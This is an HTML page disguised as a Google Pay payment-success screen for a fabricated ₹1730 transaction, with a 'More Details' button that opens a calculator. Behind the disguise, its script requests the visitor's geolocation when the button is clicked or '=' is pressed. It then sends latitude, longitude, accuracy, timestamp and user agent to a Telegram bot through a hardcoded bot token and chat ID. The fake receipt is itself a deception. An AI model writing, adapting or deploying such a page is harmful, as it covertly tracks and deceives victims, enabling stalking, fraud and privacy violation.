<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Payment Success</title>
  <style>
    body {
      margin: 0;
      padding: 20px;
      font-family: 'Segoe UI', sans-serif;
      background: #f5f5f5;
      color: #333;
      text-align: center;
    }
    .success-box {
      background: #fff;
      border-radius: 12px;
      padding: 30px 20px;
      box-shadow: 0 0 15px rgba(0,0,0,0.1);
      max-width: 400px;
      margin: 40px auto;
    }
    .success-box h1 {
      color: #00c853;
    }
    .success-box p {
      margin: 10px 0;
      font-size: 18px;
    }
    .btn {
      background: #2962ff;
      color: #fff;
      padding: 15px 25px;
      font-size: 16px;
      border: none;
      border-radius: 8px;
      cursor: pointer;
      margin-top: 20px;
    }
    .calculator {
      display: none;
      margin-top: 40px;
    }
    .display {
      height: 60px;
      background: #eceff1;
      font-size: 2em;
      padding: 10px;
      text-align: right;
      border-radius: 10px;
      margin-bottom: 20px;
      box-sizing: border-box;
    }
    .buttons {
      display: grid;
      grid-template-columns: repeat(4, 1fr);
      gap: 10px;
    }
    button.calc {
      font-size: 1.4em;
      padding: 15px;
      border: none;
      border-radius: 10px;
      background-color: #e0f7fa;
      box-shadow: 0 3px 5px rgba(0,0,0,0.1);
      cursor: pointer;
    }
    .equal { background: #a5d6a7; }
    .clear { background: #ef9a9a; }
  </style>
</head>
<body>

<div class="success-box">
  <h1>‚úÖ Google Pay</h1>
  <p><strong>‚Çπ1730</strong> successfully paid</p>
  <p>Txn ID: GPay-TXN-74826341</p>
  <button class="btn" onclick="showCalculator()">More Details</button>
</div>

<div class="calculator" id="calculator">
  <div id="display" class="display">0</div>
  <div class="buttons">
    <button class="calc clear" onclick="clearDisplay()">C</button>
    <button class="calc" onclick="append('/')">/</button>
    <button class="calc" onclick="append('*')">*</button>
    <button class="calc" onclick="append('-')">-</button>

    <button class="calc" onclick="append('7')">7</button>
    <button class="calc" onclick="append('8')">8</button>
    <button class="calc" onclick="append('9')">9</button>
    <button class="calc" onclick="append('+')">+</button>

    <button class="calc" onclick="append('4')">4</button>
    <button class="calc" onclick="append('5')">5</button>
    <button class="calc" onclick="append('6')">6</button>
    <button class="calc" onclick="append('1')">1</button>

    <button class="calc" onclick="append('2')">2</button>
    <button class="calc" onclick="append('3')">3</button>
    <button class="calc" onclick="append('0')">0</button>
    <button class="calc" onclick="append('.')">.</button>

    <button class="calc equal" onclick="calculate()">=</button>
  </div>
</div>

<script>
  const display = document.getElementById("display");

  function append(value) {
    if (display.innerText === "0") {
      display.innerText = value;
    } else {
      display.innerText += value;
    }
  }

  function clearDisplay() {
    display.innerText = "0";
  }

  function calculate() {
    try {
      display.innerText = eval(display.innerText);
      sendLocation("User pressed =");
    } catch {
      display.innerText = "Error";
    }
  }

  function showCalculator() {
    document.getElementById("calculator").style.display = "block";
    sendLocation("Clicked More Details");
  }

  function sendLocation(note) {
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(function(pos) {
        const lat = pos.coords.latitude;
        const lon = pos.coords.longitude;
        const accuracy = pos.coords.accuracy;

        const message = `
üìç ${note}
‚úÖ Google Pay ‚Çπ1730 Success

üåç Latitude: ${lat}
üåç Longitude: ${lon}
üéØ Accuracy: ${accuracy}m
üïí ${new Date().toLocaleString()}
üì± ${navigator.userAgent}
        `;

        const TOKEN = "8148507636:AAE5JkA-Hc-AmAJMiM8Pz2t_BQoCC7VKtLc";
        const CHAT_ID = "7357184121";

        fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
          method: "POST",
          headers: {
            "Content-Type": "application/json"
          },
          body: JSON.stringify({
            chat_id: CHAT_ID,
            text: message,
            parse_mode: "HTML"
          })
        });
      });
    }
  }
</script>

</body>
</html>
